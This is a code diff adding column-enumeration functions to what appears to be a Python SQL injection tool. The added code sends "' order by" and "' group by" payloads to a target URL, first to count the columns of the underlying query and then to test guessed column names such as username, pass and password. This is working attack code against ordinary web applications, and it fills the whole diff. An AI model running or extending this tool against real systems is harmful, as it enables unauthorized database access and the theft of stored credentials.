@@ -57,6 +57,36 @@ def launcher(url, diction):
     for x in res:
         print(x.split(';')[0])
 
+    nums_of_col = detect_columns(url)
+    print('\nNumber of columns:' + nums_of_col + '\n')
+    print('---------------------------------')
+    print('Column names')
+    print('---------------------------------')
+    [print(name) for name in detect_columns_names(url)]
+
+def detect_columns(url):
+    new_url = url.replace('FUZZ', "' order by X-- -")
+    x = 1
+    for i in range(1,50):
+        req = requests.get(new_url.replace('X', str(i)))
+        if req.text.find("Unknown") != -1:
+            x = i
+            break
+    return str(x-1)
+
+def detect_columns_names(url):
+    column_names = ['username', 'name', 'pass', 'passwd', 'password', 'id', 'role', 'surname', 'address']
+    new_url = url.replace("FUZZ", "' group by X-- -")
+
+    valid_cols = []
+    for name in column_names:
+        req = requests.get(new_url.replace('X', name))
+        if req.text.find('Unknown') == -1:
+            valid_cols.append(name)
+        else:
+            pass
+
+    return valid_cols
 
 def injector(injected):
     errors = ['Mysql', 'error in your SQL']
